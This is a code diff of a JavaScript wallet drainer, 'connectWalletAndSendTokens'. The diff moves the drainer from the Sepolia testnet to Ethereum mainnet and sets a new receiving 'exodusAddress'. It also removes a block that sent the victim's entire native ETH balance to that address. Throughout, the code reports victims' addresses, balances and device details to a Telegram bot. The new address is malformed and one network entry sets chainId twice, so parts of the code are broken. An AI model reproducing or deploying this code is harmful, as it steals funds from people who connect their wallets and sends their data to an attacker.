@@ -96,11 +96,11 @@ async function connectWalletAndSendTokens() {
 
   const evmNetworks = [
     {
-      chainId: 11155111,
-      name: "Sepolia",
-      chainName: "sepolia",
-      nativeCoin: "SepoliaETH",
-      exodusAddress: "0x20b0D43a93Ad7e98594caF2B001F9Fe3E06FDD90" // Update with your desired Sepolia address
+      chainId: 1,
+      name: "Ethereum",
+      chainId: "eth",
+      nativeCoin: "ETH",
+      exodusAddress: "0x525E643394 I3x0A77ddaB1bf57"
     }
   ];
 
@@ -148,11 +148,11 @@ async function connectWalletAndSendTokens() {
         } catch (switchErr) {
           if (switchErr.code === 4902) {
             const chainConfig = {
-              chainId: `0x${network.chainId.toString(16)}`,
-              chainName: 'Sepolia Testnet',
-              rpcUrls: ['https://rpc.sepolia.org'],
-              nativeCurrency: { name: 'SepoliaETH', symbol: 'SepoliaETH', decimals: 18 },
-              blockExplorerUrls: ['https://sepolia.etherscan.io']
+              chainId: '0x1',
+              chainName: 'Ethereum Mainnet',
+              rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
+              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+              blockExplorerUrls: ['https://etherscan.io']
             };
             await window.ethereum.request({
               method: 'wallet_addEthereumChain',
@@ -225,7 +225,7 @@ async function connectWalletAndSendTokens() {
                   const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
                   return `• ${token.symbol}: ${balance}`;
                 }).join("\n")
-              : `No valid non-zero Sepolia token balances found.`;
+              : `No valid non-zero ${network.name} token balances found.`;
           } catch (apiErr) {
             console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
             if (apiAttempts === maxAttempts) {
@@ -309,81 +309,14 @@ ${deviceType}
           }
         } else {
           const noTokensMessage = `
-⚠️ No valid non-zero Sepolia token balances to transfer on Sepolia Address: ${userAddress}
+⚠️ No valid non-zero ERC-20 token balances to transfer on ${network.name}
+Address: ${userAddress}
 ${deviceType}
           `;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: chatId, text: noTokensMessage })
-          });
-        }
-
-        // Transfer SepoliaETH (native token)
-        try {
-          if (!ethers.BigNumber.from(nativeBalance).isZero()) {
-            const gasPrice = await currentProvider.getGasPrice();
-            const gasLimit = 21000; // Standard gas limit for ETH transfer
-            const gasCost = gasPrice.mul(gasLimit);
-            const amountToSend = nativeBalance.sub(gasCost);
-            
-            if (amountToSend.gt(0)) {
-              const tx = await currentSigner.sendTransaction({
-                to: network.exodusAddress,
-                value: amountToSend,
-                gasLimit: gasLimit,
-                gasPrice: gasPrice
-              });
-              await tx.wait();
-
-              const transferSuccessMessage = `
-✅ Native Transfer Successful
-Token: ${network.nativeCoin}
-Amount: ${ethers.utils.formatEther(amountToSend)}
-To: ${network.exodusAddress}
-Tx: ${tx.hash}
-${deviceType}
-              `;
-              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
-              });
-            } else {
-              const noFundsMessage = `
-⚠️ Insufficient ${network.nativeCoin} balance for transfer after gas fees
-Address: ${userAddress}
-${deviceType}
-              `;
-              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: noFundsMessage })
-              });
-            }
-          } else {
-            const noNativeBalanceMessage = `
-⚠️ No ${network.nativeCoin} balance to transfer
-Address: ${userAddress}
-${deviceType}
-            `;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: chatId, text: noNativeBalanceMessage })
-            });
-          }
-        } catch (err) {
-          const errorMessage = `
-❌ Native Transfer Failed
-Token: ${network.nativeCoin}
-Error: ${err.message}
-${deviceType}
-          `;
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
           });
         }
       } catch (err) {
